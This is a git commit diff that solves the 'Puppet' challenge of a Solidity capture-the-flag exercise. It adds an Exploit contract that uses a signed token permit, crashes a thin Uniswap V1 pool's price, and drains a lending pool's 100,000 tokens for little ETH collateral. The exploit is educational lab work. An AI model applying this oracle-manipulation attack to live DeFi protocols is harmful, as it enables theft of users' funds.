e41fc5a2c39cd34c12df9c40f711a887a54fc806
Ahyun <urbanart2251@gmail.com>
2025-09-14 11:19:41 +0000

    solved puppet

--- test/puppet/Puppet.t.sol
+++ test/puppet/Puppet.t.sol
@@ -43,24 +43,40 @@ contract PuppetChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy a exchange that will be used as the factory template
-        IUniswapV1Exchange uniswapV1ExchangeTemplate =
-            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
+        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
+            deployCode(
+                string.concat(
+                    vm.projectRoot(),
+                    "/builds/uniswap/UniswapV1Exchange.json"
+                )
+            )
+        );
 
         // Deploy factory, initializing it with the address of the template exchange
-        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
+        uniswapV1Factory = IUniswapV1Factory(
+            deployCode("builds/uniswap/UniswapV1Factory.json")
+        );
         uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
 
         // Deploy token to be traded in Uniswap V1
         token = new DamnValuableToken();
 
         // Create a new exchange for the token
-        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));
+        uniswapV1Exchange = IUniswapV1Exchange(
+            uniswapV1Factory.createExchange(address(token))
+        );
 
         // Deploy the lending pool
-        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));
+        lendingPool = new PuppetPool(
+            address(token),
+            address(uniswapV1Exchange)
+        );
 
         // Add initial token and ETH liquidity to the pool
-        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
+        token.approve(
+            address(uniswapV1Exchange),
+            UNISWAP_INITIAL_TOKEN_RESERVE
+        );
         uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
             0, // min_liquidity
             UNISWAP_INITIAL_TOKEN_RESERVE,
@@ -82,26 +98,69 @@ contract PuppetChallenge is Test {
         assertEq(uniswapV1Exchange.tokenAddress(), address(token));
         assertEq(
             uniswapV1Exchange.getTokenToEthInputPrice(1e18),
-            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
+            _calculateTokenToEthInputPrice(
+                1e18,
+                UNISWAP_INITIAL_TOKEN_RESERVE,
+                UNISWAP_INITIAL_ETH_RESERVE
+            )
         );
         assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
-        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
+        assertEq(
+            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
+            POOL_INITIAL_TOKEN_BALANCE * 2
+        );
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        uint256 amount = PLAYER_INITIAL_TOKEN_BALANCE;
+        uint256 deadline = block.timestamp + 1 hours;
+
+        address predictedExploit = vm.computeCreateAddress(
+            player,
+            vm.getNonce(player)
+        );
+
+        string
+            memory PERMIT_TYPEDEF = "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)";
+
+        uint256 nonce = token.nonces(player);
+        bytes32 structHash = vm.eip712HashStruct(
+            PERMIT_TYPEDEF,
+            abi.encode(player, predictedExploit, amount, nonce, deadline)
+        );
+
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash)
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+
+        new Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            uniswapV1Exchange,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            player,
+            deadline,
+            v,
+            r,
+            s,
+            lendingPool,
+            recovery
+        );
     }
 
     // Utility function to calculate Uniswap prices
-    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
-        private
-        pure
-        returns (uint256)
-    {
-        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
+    function _calculateTokenToEthInputPrice(
+        uint256 tokensSold,
+        uint256 tokensInReserve,
+        uint256 etherInReserve
+    ) private pure returns (uint256) {
+        return
+            (tokensSold * 997 * etherInReserve) /
+            (tokensInReserve * 1000 + tokensSold * 997);
     }
 
     /**
@@ -112,7 +171,44 @@ contract PuppetChallenge is Test {
         assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
         // All tokens of the lending pool were deposited into the recovery account
-        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
-        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(address(lendingPool)),
+            0,
+            "Pool still has tokens"
+        );
+        assertGe(
+            token.balanceOf(recovery),
+            POOL_INITIAL_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Exploit {
+    constructor(
+        DamnValuableToken token,
+        IUniswapV1Exchange uniswapV1Exchange,
+        uint256 tokenAmount,
+        address player,
+        uint256 deadline,
+        uint8 v,
+        bytes32 r,
+        bytes32 s,
+        PuppetPool pool,
+        address recovery
+    ) payable {
+        // 1 eth => huge DVT
+        // swap large DVT ->ETH in pool
+        // target: exploit 100,000 DVT
+        // >= 200,000 DVT in ETH
+        // original pool: 10*10 =100
+        // user has: 25 ETH, 1000 DVT
+        // push 490 DVT -> 0.2 ETH left => 500 : 0.2 => 2500 DVT: 1ETH => 100,000 DVT: 40 ETH
+        // push 990 DVT -> 0.1 ETH left => 1000: 0.1 => 10000 DVT: 1ETH => 100,000 DVT: 10 ETH
+        token.permit(player, address(this), tokenAmount, deadline, v, r, s);
+        token.transferFrom(player, address(this), tokenAmount);
+        token.approve(address(uniswapV1Exchange), type(uint256).max);
+        uniswapV1Exchange.tokenToEthSwapInput(990e18, 1, deadline);
+        pool.borrow{value: address(this).balance}(100_000e18, recovery);
     }
 }
